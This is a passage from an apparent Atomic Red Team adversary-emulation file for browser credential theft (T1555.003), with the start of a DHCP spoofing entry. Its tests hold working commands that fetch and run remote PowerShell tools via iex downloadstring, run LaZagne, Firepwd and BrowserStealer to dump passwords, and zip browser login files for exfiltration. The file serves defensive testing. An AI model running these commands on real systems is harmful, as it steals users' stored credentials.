      - source_name: Microsoft CryptUnprotectData April 2018
        url: https://docs.microsoft.com/en-us/windows/desktop/api/dpapi/nf-dpapi-cryptunprotectdata
        description: Microsoft. (2018, April 12). CryptUnprotectData function. Retrieved
          June 18, 2019.
      - source_name: Proofpoint Vega Credential Stealer May 2018
        url: https://www.proofpoint.com/us/threat-insight/post/new-vega-stealer-shines-brightly-targeted-campaign
        description: Proofpoint. (2018, May 10). New Vega Stealer shines brightly
          in targeted campaign . Retrieved June 18, 2019.
      - source_name: FireEye HawkEye Malware July 2017
        url: https://www.fireeye.com/blog/threat-research/2017/07/hawkeye-malware-distributed-in-phishing-campaign.html
        description: Swapnil Patil, Yogesh Londhe. (2017, July 25). HawkEye Credential
          Theft Malware Distributed in Recent Phishing Campaign. Retrieved June 18,
          2019.
      - source_name: GitHub Mimikittenz July 2016
        url: https://github.com/putterpanda/mimikittenz
        description: Jamieson O'Reilly (putterpanda). (2016, July 4). mimikittenz.
          Retrieved June 20, 2019.
      modified: '2022-02-15T19:29:57.405Z'
      name: 'Credentials from Password Stores: Credentials from Web Browsers'
      description: "Adversaries may acquire credentials from web browsers by reading
        files specific to the target browser.(Citation: Talos Olympic Destroyer 2018)
        Web browsers commonly save credentials such as website usernames and passwords
        so that they do not need to be entered manually in the future. Web browsers
        typically store the credentials in an encrypted format within a credential
        store; however, methods exist to extract plaintext credentials from web browsers.\n\nFor
        example, on Windows systems, encrypted credentials may be obtained from Google
        Chrome by reading a database file, <code>AppData\\Local\\Google\\Chrome\\User
        Data\\Default\\Login Data</code> and executing a SQL query: <code>SELECT action_url,
        username_value, password_value FROM logins;</code>. The plaintext password
        can then be obtained by passing the encrypted credentials to the Windows API
        function <code>CryptUnprotectData</code>, which uses the victim‚Äôs cached logon
        credentials as the decryption key.(Citation: Microsoft CryptUnprotectData
        April 2018)\n \nAdversaries have executed similar procedures for common web
        browsers such as FireFox, Safari, Edge, etc.(Citation: Proofpoint Vega Credential
        Stealer May 2018)(Citation: FireEye HawkEye Malware July 2017) Windows stores
        Internet Explorer and Microsoft Edge credentials in Credential Lockers managed
        by the [Windows Credential Manager](https://attack.mitre.org/techniques/T1555/004).\n\nAdversaries
        may also acquire credentials by searching web browser process memory for patterns
        that commonly match credentials.(Citation: GitHub Mimikittenz July 2016)\n\nAfter
        acquiring credentials from web browsers, adversaries may attempt to recycle
        the credentials across different systems and/or accounts in order to expand
        access. This can result in significantly furthering an adversary's objective
        in cases where credentials gained from web browsers overlap with privileged
        accounts (e.g. domain administrator)."
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: credential-access
      x_mitre_detection: 'Identify web browser files that contain credentials such
        as Google Chrome‚Äôs Login Data database file: <code>AppData\Local\Google\Chrome\User
        Data\Default\Login Data</code>. Monitor file read events of web browser files
        that contain credentials, especially when the reading process is unrelated
        to the subject web browser. Monitor process execution logs to include PowerShell
        Transcription focusing on those that perform a combination of behaviors including
        reading web browser process memory, utilizing regular expressions, and those
        that contain numerous keywords for common web applications (Gmail, Twitter,
        Office365, etc.).'
      x_mitre_is_subtechnique: true
      x_mitre_version: '1.1'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'Process: Process Access'
      - 'File: File Access'
      - 'Process: OS API Execution'
      - 'Command: Command Execution'
      x_mitre_permissions_required:
      - User
      identifier: T1555.003
    atomic_tests:
    - name: Run Chrome-password Collector
      auto_generated_guid: 8c05b133-d438-47ca-a630-19cc464c4622
      description: |
        A modified sysinternals suite will be downloaded and staged. The Chrome-password collector, renamed accesschk.exe, will then be executed from #{file_path}.

        Successful execution will produce stdout message stating "Copying db ... passwordsDB DB Opened. statement prepare DB connection closed properly". Upon completion, final output will be a file modification of $env:TEMP\sysinternals\passwordsdb.

        Adapted from [MITRE ATTACK Evals](https://github.com/mitre-attack/attack-arsenal/blob/66650cebd33b9a1e180f7b31261da1789cdceb66/adversary_emulation/APT29/CALDERA_DIY/evals/data/abilities/credential-access/e7cab9bb-3e3a-4d93-99cc-3593c1dc8c6d.yml)
      supported_platforms:
      - windows
      input_arguments:
        file_path:
          description: File path for modified Sysinternals
          type: string
          default: "$env:TEMP"
      dependency_executor_name: powershell
      dependencies:
      - description: 'Modified Sysinternals must be located at #{file_path}

          '
        prereq_command: 'if (Test-Path #{file_path}\SysInternals) {exit 0} else {exit
          1}

          '
        get_prereq_command: |
          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
          Invoke-WebRequest "https://github.com/mitre-attack/attack-arsenal/raw/66650cebd33b9a1e180f7b31261da1789cdceb66/adversary_emulation/APT29/CALDERA_DIY/evals/payloads/Modified-SysInternalsSuite.zip" -OutFile "#{file_path}\Modified-SysInternalsSuite.zip"
          Expand-Archive #{file_path}\Modified-SysInternalsSuite.zip #{file_path}\sysinternals -Force
          Remove-Item #{file_path}\Modified-SysInternalsSuite.zip -Force
      executor:
        command: |
          Set-Location -path "#{file_path}\Sysinternals";
          ./accesschk.exe -accepteula .;
        cleanup_command: 'Remove-Item #{file_path}\Sysinternals -Force -Recurse -ErrorAction
          Ignore

          '
        name: powershell
    - name: Search macOS Safari Cookies
      auto_generated_guid: c1402f7b-67ca-43a8-b5f3-3143abedc01b
      description: |
        This test uses `grep` to search a macOS Safari binaryCookies file for specified values. This was used by CookieMiner malware.

        Upon successful execution, MacOS shell will cd to `~/Libraries/Cookies` and grep for `Cookies.binarycookies`.
      supported_platforms:
      - macos
      input_arguments:
        search_string:
          description: String to search Safari cookies to find.
          type: string
          default: coinbase
      executor:
        command: |
          cd ~/Library/Cookies
          grep -q "#{search_string}" "Cookies.binarycookies"
        name: sh
    - name: LaZagne - Credentials from Browser
      auto_generated_guid: 9a2915b3-3954-4cce-8c76-00fbf4dbd014
      description: "The following Atomic test utilizes [LaZagne](https://github.com/AlessandroZ/LaZagne)
        to extract passwords from browsers on the Windows operating system.\nLaZagne
        is an open source application used to retrieve passwords stored on a local
        computer. \n"
      supported_platforms:
      - windows
      input_arguments:
        lazagne_path:
          description: Path to LaZagne
          type: path
          default: PathToAtomicsFolder\T1555.003\bin\LaZagne.exe
      dependency_executor_name: powershell
      dependencies:
      - description: 'LaZagne.exe must exist on disk at specified location (#{lazagne_path})

          '
        prereq_command: 'if (Test-Path #{lazagne_path}) {exit 0} else {exit 1}

          '
        get_prereq_command: |
          New-Item -Type Directory (split-path #{lazagne_path}) -ErrorAction ignore | Out-Null
          Invoke-WebRequest "https://github.com/AlessandroZ/LaZagne/releases/download/2.4.5/lazagne.exe" -OutFile "#{lazagne_path}"
      executor:
        name: command_prompt
        elevation_required: true
        command: "#{lazagne_path} browsers\n"
    - name: Simulating access to Chrome Login Data
      auto_generated_guid: 3d111226-d09a-4911-8715-fe11664f960d
      description: "Simulates an adversary accessing encrypted credentials from Google
        Chrome Login database. \n"
      supported_platforms:
      - windows
      dependency_executor_name: powershell
      dependencies:
      - description: 'Chrome must be installed

          '
        prereq_command: if ((Test-Path "C:\Program Files\Google\Chrome\Application\chrome.exe")
          -Or (Test-Path "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"))
          {exit 0} else {exit 1}
        get_prereq_command: |
          $installer = "$env:temp\ChromeStandaloneSetup64.msi"
          Invoke-WebRequest -OutFile $env:temp\ChromeStandaloneSetup64.msi https://dl.google.com/chrome/install/googlechromestandaloneenterprise64.msi
          msiexec /i $installer /qn
          Start-Process -FilePath "chrome.exe"
          Stop-Process -Name "chrome"
      executor:
        name: powershell
        command: |
          Copy-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data" -Destination $env:temp
          Copy-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data For Account" -Destination $env:temp
        cleanup_command: |
          Remove-Item -Path "$env:temp\Login Data" -Force -ErrorAction Ignore
          Remove-Item -Path "$env:temp\Login Data For Account" -Force -ErrorAction Ignore
    - name: Simulating access to Opera Login Data
      auto_generated_guid: 28498c17-57e4-495a-b0be-cc1e36de408b
      description: "Simulates an adversary accessing encrypted credentials from Opera
        web browser's login database. \n"
      supported_platforms:
      - windows
      dependency_executor_name: powershell
      dependencies:
      - description: 'Opera must be installed

          '
        prereq_command: if (((Test-Path "$env:LOCALAPPDATA\Programs\Opera\launcher.exe")
          -Or (Test-Path "C:\Program Files\Opera\launcher.exe") -Or (Test-Path "C:\Program
          Files (x86)\Opera\launcher.exe"))) {exit 0} else {exit 1}
        get_prereq_command: |
          $installer = "$env:temp\OperaStandaloneInstaller.exe"
          Invoke-WebRequest -OutFile $env:temp\OperaStandaloneInstaller.exe https://get.geo.opera.com/pub/opera/desktop/82.0.4227.43/win/Opera_82.0.4227.43_Setup.exe
          Start-Process $installer -ArgumentList '/install /silent /launchopera=1 /setdefaultbrowser=0'
          Start-Sleep -s 180
          Stop-Process -Name "opera"
      - description: 'Opera login data file must exist

          '
        prereq_command: if (Test-Path "$env:APPDATA\Opera Software\Opera Stable\Login
          Data") {exit 0} else {exit 1}
        get_prereq_command: 'New-Item -Path "$env:APPDATA\Opera Software\Opera Stable\Login
          Data" -ItemType File

          '
      executor:
        name: powershell
        command: 'Copy-Item "$env:APPDATA\Opera Software\Opera Stable\Login Data"
          -Destination $env:temp

          '
        cleanup_command: 'Remove-Item -Path "$env:temp\Login Data" -Force -ErrorAction
          Ignore

          '
    - name: Simulating access to Windows Firefox Login Data
      auto_generated_guid: eb8da98a-2e16-4551-b3dd-83de49baa14c
      description: |
        Simulates an adversary accessing encrypted credentials from firefox web browser's login database.
        more info in https://support.mozilla.org/en-US/kb/profiles-where-firefox-stores-user-data
      supported_platforms:
      - windows
      dependency_executor_name: powershell
      dependencies:
      - description: 'Firefox must be installed

          '
        prereq_command: if ((Test-Path "C:\Program Files\Mozilla Firefox\firefox.exe")
          -Or (Test-Path "C:\Program Files (x86)\Mozilla Firefox\firefox.exe")) {exit
          0} else {exit 1}
        get_prereq_command: |
          if ($env:PROCESSOR_ARCHITECTURE -eq 'AMD64') {$url="https://download.mozilla.org/?product=firefox-latest-ssl&os=win64&lang=en-US"}else {$url="https://download.mozilla.org/?product=firefox-latest-ssl&os=win&lang=en-US"}
          $installer = "$env:temp\firefoxsetup.exe"
          (New-Object Net.WebClient).DownloadFile($url,$installer)
          Start-Process $installer -ArgumentList '/S' -Wait
      - description: 'Firefox login data file must exist

          '
        prereq_command: if (Test-Path "$env:APPDATA\Mozilla\Firefox\Profiles\") {exit
          0} else {exit 1}
        get_prereq_command: |
          if ($env:PROCESSOR_ARCHITECTURE -eq 'AMD64') {$firefox="C:\Program Files\Mozilla Firefox\firefox.exe"}else {$firefox="C:\Program Files (x86)\Mozilla Firefox\firefox.exe"}
          Start-Process $firefox -ArgumentList '-CreateProfile Atomic' -Wait
          Start-Process $firefox -NoNewWindow
          Start-Sleep -s 20
          Stop-Process -Name firefox
      executor:
        name: powershell
        command: 'Copy-Item "$env:APPDATA\Mozilla\Firefox\Profiles\" -Destination
          $env:temp -Force -Recurse

          '
        cleanup_command: 'Remove-Item -Path "$env:temp\Profiles" -Force -ErrorAction
          Ignore -Recurse

          '
    - name: Simulating access to Windows Edge Login Data
      auto_generated_guid: a6a5ec26-a2d1-4109-9d35-58b867689329
      description: |
        Simulates an adversary accessing encrypted credentials from Edge web browser's login database.
        more info in https://www.forensicfocus.com/articles/chromium-based-microsoft-edge-from-a-forensic-point-of-view/
      supported_platforms:
      - windows
      dependency_executor_name: powershell
      dependencies:
      - description: 'Edge must be installed

          '
        prereq_command: if (Test-Path "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe")
          {exit 0} else {exit 1}
        get_prereq_command: '"Installation is not implemented as Edge is a part of
          windows"

          '
      - description: 'Edge login data file must exist

          '
        prereq_command: if (Test-Path "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default")
          {exit 0} else {exit 1}
        get_prereq_command: "$edge=\"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\"\nStart-Process
          $edge \nStart-Sleep -s 20\nStop-Process -Name msedge\n"
      executor:
        name: powershell
        command: 'Copy-Item "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default" -Destination
          $env:temp\Edge -Force -Recurse

          '
        cleanup_command: 'Remove-Item -Path "$env:temp\Edge" -Force -ErrorAction Ignore
          -Recurse

          '
    - name: Decrypt Mozilla Passwords with Firepwd.py
      auto_generated_guid: dc9cd677-c70f-4df5-bd1c-f114af3c2381
      description: "Firepwd.py is a script that can decrypt Mozilla (Thunderbird,
        Firefox) passwords.\nUpon successful execution, the decrypted credentials
        will be output to a text file, as well as displayed on screen. \n"
      supported_platforms:
      - windows
      input_arguments:
        Firepwd_Path:
          description: Filepath for Firepwd.py
          type: string
          default: "$env:temp\\Firepwd.py"
        Out_Filepath:
          description: Filepath to output results to
          type: string
          default: "$env:temp\\T1555.003Test8.txt"
        VS_CMD_Path:
          description: Filepath to Visual Studio Build Tools Command prompt
          type: string
          default: C:\Program Files (x86)\Microsoft Visual Studio\2022\BuildTools\VC\Auxiliary\Build\vcvars64.bat
        Python_Path:
          description: Filepath to python
          type: string
          default: C:\Program Files\Python310\python.exe
      dependency_executor_name: powershell
      dependencies:
      - description: 'Firepwd must exist at #{Firepwd_Path}

          '
        prereq_command: 'if (Test-Path "#{Firepwd_Path}") {exit 0} else {exit 1}

          '
        get_prereq_command: 'Invoke-WebRequest "https://raw.githubusercontent.com/lclevy/firepwd/167eabf3b88d5a7ba8b8bc427283f827b6885982/firepwd.py"
          -outfile "#{Firepwd_Path}"

          '
      - description: 'Firefox profile directory must be present

          '
        prereq_command: 'if (get-childitem -path "$env:appdata\Mozilla\Firefox\Profiles\*.default-release\"
          -erroraction silentlycontinue) {exit 0} else {exit 1}

          '
        get_prereq_command: |
          Invoke-WebRequest "https://ftp.mozilla.org/pub/firefox/releases/98.0/win64/en-US/Firefox%20Setup%2098.0.msi" -outfile "$env:temp\firefox.msi"
          msiexec.exe /i "$env:temp\firefox.msi" /quiet
          sleep -s 30
          start-process "$env:programfiles\Mozilla Firefox\firefox.exe".
          sleep -s 5
          stop-process -name "firefox"
      - description: 'Visual Studio Build Tools command prompt must exist at #{VS_CMD_Path}

          '
        prereq_command: 'if (Test-Path "#{VS_CMD_Path}") {exit 0} else {exit 1}

          '
        get_prereq_command: |
          invoke-webrequest "https://aka.ms/vs/17/release/vs_BuildTools.exe" -outfile "$env:temp\VS_BuildTools.exe"
          write-host "Visual Studio Build Tools (Desktop Development with C++) must be installed manually. Please run the installer from $env:temp\VS_BuildTools.exe."
      - description: 'Python must be installed

          '
        prereq_command: 'if (Test-Path "#{Python_Path}") {exit 0} else {exit 1}

          '
        get_prereq_command: |
          invoke-webrequest "https://www.python.org/ftp/python/3.10.4/python-3.10.4-amd64.exe" -outfile "$env:temp\python_setup.exe"
          Start-Process -FilePath $env:TEMP\python_setup.exe -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1 Include_test=0" -Wait
      - description: 'Pip must be installed.

          '
        prereq_command: |
          $env:Path = [System.Environment]::ExpandEnvironmentVariables([System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User"))
          if (pip -v) {exit 0} else {exit 1}
        get_prereq_command: "invoke-webrequest \"https://bootstrap.pypa.io/ez_setup.py\"
          -outfile \"$env:temp\\ez_setup.py\"      \ninvoke-webrequest \"https://bootstrap.pypa.io/get-pip.py\"
          -outfile \"$env:temp\\get-pip.py\"\ncmd /c \"$env:temp\\ez_setup.py\"\ncmd
          /c \"$env:temp\\get-pip.py\"\n"
      - description: "Pycryptodome library must be installed \n"
        prereq_command: |
          $env:Path = [System.Environment]::ExpandEnvironmentVariables([System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User"))
          if (pip show pycryptodome) {exit 0} else {exit 1}
        get_prereq_command: |
          $env:Path = [System.Environment]::ExpandEnvironmentVariables([System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User"))
          if (test-path "#{VS_CMD_Path}"){pip install pycryptodome | out-null | cmd /c %comspec% /k "#{VS_CMD_Path}" | out-null} else {write-host "Visual Studio Build Tools (C++ Support) must be installed to continue gathering this prereq"}
      - description: "Pyasn1 library must be installed \n"
        prereq_command: |
          $env:Path = [System.Environment]::ExpandEnvironmentVariables([System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User"))
          if (pip show pyasn1) {exit 0} else {exit 1}
        get_prereq_command: |
          $env:Path = [System.Environment]::ExpandEnvironmentVariables([System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User"))
          if (test-path "#{VS_CMD_Path}"){pip install pyasn1 | out-null | cmd /c %comspec% /k "#{VS_CMD_Path}" | out-null} else {write-host "Visual Studio Build Tools (C++ Support) must be installed to continue gathering this prereq."}
      executor:
        name: powershell
        command: |
          $PasswordDBLocation = get-childitem -path "$env:appdata\Mozilla\Firefox\Profiles\*.default-release\"
          cmd /c #{Firepwd_Path} -d $PasswordDBLocation > #{Out_Filepath}
          cat #{Out_Filepath}
        cleanup_command: "Remove-Item -Path \"#{Out_Filepath}\" -erroraction silentlycontinue
          \  \n"
    - name: LaZagne.py - Dump Credentials from Firefox Browser
      auto_generated_guid: 87e88698-621b-4c45-8a89-4eaebdeaabb1
      description: Credential Dump Ubuntu 20.04.4 LTS Focal Fossa Firefox Browser,
        Reference https://github.com/AlessandroZ/LaZagne
      supported_platforms:
      - linux
      input_arguments:
        lazagne_path:
          description: Path you put LaZagne Github with LaZagne.py
          type: string
          default: "/tmp/LaZagne/Linux"
        specific_module:
          description: You may change the module to "all" for all password that can
            be found by LaZagne.py
          type: string
          default: browsers -firefox
        output_file:
          description: This is where output for the Firefox passwords goes
          type: string
          default: "/tmp/firefox_password.txt"
      dependency_executor_name: sh
      dependencies:
      - description: Get Lazagne from Github and install requirements
        prereq_command: 'test -f #{lazagne_path}/laZagne.py'
        get_prereq_command: cd /tmp; git clone https://github.com/AlessandroZ/LaZagne;
          cd /tmp/LaZagne/; pip install -r requirements.txt
      - description: Needs git, python3 and some pip stuff
        prereq_command: which git && which python3 && which pip
        get_prereq_command: apt install git; apt install python3-pip -y; pip install
          pyasn1 psutil Crypto
      executor:
        command: 'python3 #{lazagne_path}/laZagne.py #{specific_module} >> #{output_file}'
        cleanup_command: 'rm -R /tmp/LaZagne; rm -f #{output_file}'
        name: sh
        elevation_required: true
    - name: Stage Popular Credential Files for Exfiltration
      auto_generated_guid: f543635c-1705-42c3-b180-efd6dc6e7ee7
      description: "This test is designed to search a drive for credential files used
        by the most common web browsers on Windows (Firefox, Chrome, Opera, and Edge),
        export the found files to a folder, and zip it,\nsimulating how an adversary
        might stage sensitive credential files for exfiltration in order to conduct
        offline password extraction with tools like [firepwd.py](https://github.com/lclevy/firepwd)
        or [HackBrowserData](https://github.com/moonD4rk/HackBrowserData). \n"
      supported_platforms:
      - windows
      executor:
        name: powershell
        command: "$exfil_folder = \"$env:temp\\T1555.003\"\nif (test-path \"$exfil_folder\")
          {} else {new-item -path \"$env:temp\" -Name \"T1555.003\" -ItemType \"directory\"
          -force}\n$FirefoxCredsLocation = get-childitem -path \"$env:appdata\\Mozilla\\Firefox\\Profiles\\*.default-release\\\"\nif
          (test-path \"$FirefoxCredsLocation\\key4.db\") {copy-item \"$FirefoxCredsLocation\\key4.db\"
          -destination \"$exfil_folder\\T1555.003Firefox_key4.db\"} else {}\nif (test-path
          \"$FirefoxCredsLocation\\logins.json\") {copy-item \"$FirefoxCredsLocation\\logins.json\"
          -destination \"$exfil_folder\\T1555.003Firefox_logins.json\"} else {}\nif
          (test-path \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login
          Data\") {copy-item \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login
          Data\" -destination \"$exfil_folder\\T1555.003Chrome_Login Data\"} else
          {}\nif (test-path \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login
          Data For Account\") {copy-item \"$env:localappdata\\Google\\Chrome\\User
          Data\\Default\\Login Data For Account\" -destination \"$exfil_folder\\T1555.003Chrome_Login
          Data For Account\"} else {}\nif (test-path \"$env:appdata\\Opera Software\\Opera
          Stable\\Login Data\") {copy-item \"$env:appdata\\Opera Software\\Opera Stable\\Login
          Data\" -destination \"$exfil_folder\\T1555.003Opera_Login Data\"} else {}\nif
          (test-path \"$env:localappdata/Microsoft/Edge/User Data/Default/Login Data\")
          {copy-item \"$env:localappdata/Microsoft/Edge/User Data/Default/Login Data\"
          -destination \"$exfil_folder\\T1555.003Edge_Login Data\"} else {} \ncompress-archive
          -path \"$exfil_folder\" -destinationpath \"$exfil_folder.zip\" -force\n"
        cleanup_command: "Remove-Item -Path \"$env:temp\\T1555.003.zip\" -force -erroraction
          silentlycontinue   \nRemove-Item -Path \"$env:temp\\T1555.003\\\" -force
          -recurse -erroraction silentlycontinue\n"
    - name: WinPwn - BrowserPwn
      auto_generated_guid: 764ea176-fb71-494c-90ea-72e9d85dce76
      description: Collect Browser credentials as well as the history via winpwn browserpwn
        function of WinPwn.
      supported_platforms:
      - windows
      executor:
        command: |-
          $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
          iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
          browserpwn -consoleoutput -noninteractive
        cleanup_command: rm .\System.Data.SQLite.dll -ErrorAction Ignore
        name: powershell
    - name: WinPwn - Loot local Credentials - mimi-kittenz
      auto_generated_guid: ec1d0b37-f659-4186-869f-31a554891611
      description: Loot local Credentials - mimi-kittenz technique via function of
        WinPwn - Extend timeout to 600s
      supported_platforms:
      - windows
      executor:
        command: |-
          $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
          iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
          kittenz -consoleoutput -noninteractive
        name: powershell
    - name: WinPwn - PowerSharpPack - Sharpweb for Browser Credentials
      auto_generated_guid: e5e3d639-6ea8-4408-9ecd-d5a286268ca0
      description: PowerSharpPack - Sharpweb searching for Browser Credentials technique
        via function of WinPwn
      supported_platforms:
      - windows
      executor:
        command: |-
          iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Sharpweb.ps1')
          Invoke-Sharpweb -command "all"
        name: powershell
    - name: Simulating Access to Chrome Login Data - MacOS
      auto_generated_guid: 124e13e5-d8a1-4378-a6ee-a53cd0c7e369
      description: "This test locates the Login Data files used by Chrome to store
        encrypted credentials, then copies them to the temp directory for later exfil.
        \nOnce the files are exfiltrated, malware like CookieMiner could be used to
        perform credential extraction. \nSee https://unit42.paloaltonetworks.com/mac-malware-steals-cryptocurrency-exchanges-cookies/
        . \n"
      supported_platforms:
      - macos
      executor:
        command: |
          cp ~/Library/"Application Support/Google/Chrome/Default/Login Data" "/tmp/T1555.003_Login Data"
          cp ~/Library/"Application Support/Google/Chrome/Default/Login Data For Account" "/tmp/T1555.003_Login Data For Account"
        cleanup_command: |
          rm "/tmp/T1555.003_Login Data" >/dev/null 2>&1
          rm "/tmp/T1555.003_Login Data For Account" >/dev/null 2>&1
        name: sh
    - name: WebBrowserPassView - Credentials from Browser
      auto_generated_guid: e359627f-2d90-4320-ba5e-b0f878155bbe
      description: The following Atomic test utilizes WebBrowserPassView to extract
        passwords from browsers on a Window system. WebBrowserPassView is an open
        source application used to retrieve passwords stored on a local computer.
        Recently noticed as a tool used in the BlackCat Ransomware.
      supported_platforms:
      - windows
      input_arguments:
        webbrowserpassview_path:
          description: 'Path to the WebBrowserPassView executable '
          type: string
          default: PathToAtomicsFolder\T1555.003\bin\WebBrowserPassView.exe
      dependency_executor_name: powershell
      dependencies:
      - description: 'Check if WebBrowserPassView.exe exists in the specified path
          #{webbrowserpassview_path}

          '
        prereq_command: 'if (Test-Path #{webbrowserpassview_path}) {exit 0} else {exit
          1}

          '
        get_prereq_command: 'Invoke-WebRequest https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1555.003/bin/WebBrowserPassView.exe
          -OutFile #{webbrowserpassview_path}

          '
      executor:
        command: |
          Start-Process #{webbrowserpassview_path}
          Start-Sleep -Second 4
          Stop-Process -Name "WebBrowserPassView"
        name: powershell
        elevation_required: true
    - name: BrowserStealer (Chrome / Firefox / Microsoft Edge)
      auto_generated_guid: 6f2c5c87-a4d5-4898-9bd1-47a55ecaf1dd
      description: |
        [Github Repo](https://github.com/SaulBerrenson/BrowserStealer) Simple password/cookies stealer for chrome, edge, and gecko based browsers (30 listed working). This attack simulates stealing the data from the browser files and printing them to the command line.
        If using to test with Firefox, if the browser is x64 you need to use the x64 build
      supported_platforms:
      - windows
      dependency_executor_name: powershell
      dependencies:
      - description: 'Google Chrome must be on the device.

          '
        prereq_command: '''if ((Test-Path "C:\Program Files\Google\Chrome\Application\chrome.exe")
          -Or (Test-Path "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"))
          {exit 0} else {exit 1}''

          '
        get_prereq_command: |
          $installer = "$env:temp\ChromeStandaloneSetup64.msi"
          Invoke-WebRequest -OutFile $env:temp\ChromeStandaloneSetup64.msi https://dl.google.com/chrome/install/googlechromestandaloneenterprise64.msi
          msiexec /i $installer /qn
          Start-Process -FilePath "chrome.exe"
          Stop-Process -Name "chrome"
      - description: 'BrowserCollector must exist in the bin directory

          '
        prereq_command: 'if (Test-Path "PathToAtomicsFolder\T1555.003\bin\BrowserCollector.exe")
          {exit 0} else {exit 1}

          '
        get_prereq_command: 'Invoke-WebRequest "https://github.com/SaulBerrenson/BrowserStealer/releases/download/1.0.0.4/BrowserCollector_x64.exe"
          -Outfile: "PathToAtomicsFolder\T1555.003\bin\BrowserCollector.exe"'
      - description: 'Login Data file that is a copy of a chrome Login Data that contains
          credentials for the tool to "steal." Must exist at the specified path.

          '
        prereq_command: if (Test-Path "PathToAtomicsFolder\T1555.003\src\Login Data")
          {exit 0} else {exit 1}
        get_prereq_command: 'Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T155.003/src/LoginData?raw=true"
          -Outfile: "PathToAtomicsFolder\T1555.003\src\Login Data"'
      executor:
        command: |
          Copy-Item "$env:localappdata\Google\Chrome\User Data\Default\Login Data" -Destination "$env:temp" > $null
          Remove-Item "$env:localappdata\Google\Chrome\User Data\Default\Login Data" > $null
          Copy-Item "$env:PathToAtomicsFolder\T1555.003\src\Login Data" -Destination "$env:localappdata\Google\Chrome\User Data\Default\" > $null
          cd "$env:PathToAtomicsFolder\T1555.003\bin"
          .\BrowserCollector.exe
        cleanup_command: |
          Remove-Item "$env:localappdata\Google\Chrome\User Data\Default\Login Data" > $null
          Copy-Item "$env:temp" -Destination "$env:localappdata\Google\Chrome\User Data\Default\Login Data" > $null
          Remove-Item "$env:temp\Login Data" > $null
        name: powershell
  T1557.003:
    technique:
      modified: '2022-10-21T15:18:16.023Z'
      name: DHCP Spoofing
      description: "Adversaries may redirect network traffic to adversary-owned systems
        by spoofing Dynamic Host Configuration Protocol (DHCP) traffic and acting
        as a malicious DHCP server on the victim network. By achieving the adversary-in-the-middle
        (AiTM) position, adversaries may collect network communications, including
        passed credentials, especially those sent over insecure, unencrypted protocols.
        This may also enable follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040)
        or [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002).\n\nDHCP
        is based on a client-server model and has two functionalities: a protocol
        for providing network configuration settings from a DHCP server to a client
        and a mechanism for allocating network addresses to clients.(Citation: rfc2131)
        The typical server-client interaction is as follows: \n\n1. The client broadcasts
        a `DISCOVER` message.\n\n2. The server responds with an `OFFER` message, which
        includes an available network address. \n\n3. The client broadcasts a `REQUEST`
        message, which includes the network address offered. \n\n4. The server acknowledges
        with an `ACK` message and the client receives the network configuration parameters.\n\nAdversaries
        may spoof as a rogue DHCP server on the victim network, from which legitimate
        hosts may receive malicious network configurations. For example, malware can
        act as a DHCP server and provide adversary-owned DNS servers to the victimized
        computers.(Citation: new_rogue_DHCP_serv_malware)(Citation: w32.tidserv.g)
        Through the malicious network configurations, an adversary may achieve the
        AiTM position, route client traffic through adversary-controlled systems,
        and collect information from the client network.\n\nDHCPv6 clients can receive
        network configuration information without being assigned an IP address by
        sending a <code>INFORMATION-REQUEST (code 11)</code> message to the <code>All_DHCP_Relay_Agents_and_Servers</code>
        multicast address.(Citation: rfc3315) Adversaries may use their rogue DHCP
        server to respond to this request message with malicious network configurations.\n\nRather
        than establishing an AiTM position, adversaries may also abuse DHCP spoofing
        to perform a DHCP exhaustion attack (i.e, [Service Exhaustion Flood](https://attack.mitre.org/techniques/T1499/002))
        by generating many broadcast DISCOVER messages to exhaust a network‚Äôs DHCP
        allocation pool. "
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: credential-access
      - kill_chain_name: mitre-attack
        phase_name: collection
      x_mitre_detection: 'Monitor network traffic for suspicious/malicious behavior
        involving DHCP, such as changes in DNS and/or gateway parameters. Additionally,
        monitor Windows logs for Event IDs (EIDs) 1341, 1342, 1020 and 1063, which
        specify that the IP allocations are low or have run out; these EIDs may indicate
        a denial of service attack.(Citation: dhcp_serv_op_events)(Citation: solution_monitor_dhcp_scopes)'
      x_mitre_platforms:
      - Linux
      - Windows
      - macOS
